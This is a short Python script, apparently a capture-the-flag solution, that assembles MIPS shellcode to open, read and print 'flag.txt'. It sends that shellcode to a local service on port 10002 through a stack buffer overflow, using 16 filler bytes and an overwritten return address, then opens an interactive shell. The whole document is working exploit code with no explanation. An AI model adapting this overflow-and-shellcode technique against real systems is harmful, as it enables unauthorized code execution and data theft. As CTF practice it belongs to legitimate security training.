asm = '''.section .text
.global _start

.ascii "%s"
_start:
  b get_addr
  nop
ret:
  move $v1, $ra
open:
  move $a0, $v1
  move $a1, $zero
  move $a2, $zero
  bal open2
read:
  move $a0, $v0
  move $a1, $v1
  li $a2, 0x7f
  bal read2
write:
  li $a0, 1
  move $a1, $v1
  li $a2, 0x7f
  bal write2
open2:
  .word 0x00000305
  .word 0xe8206500
  .word 0x65006500
read2:
  .word 0x00000385
  .word 0xe8206500
  .word 0x65006500
write2:
  .word 0x00000405
  .word 0xe8206500
  .word 0x65006500
get_addr:
  bal ret
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'mips'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10002
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x800006f4
shellcode = 'AAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
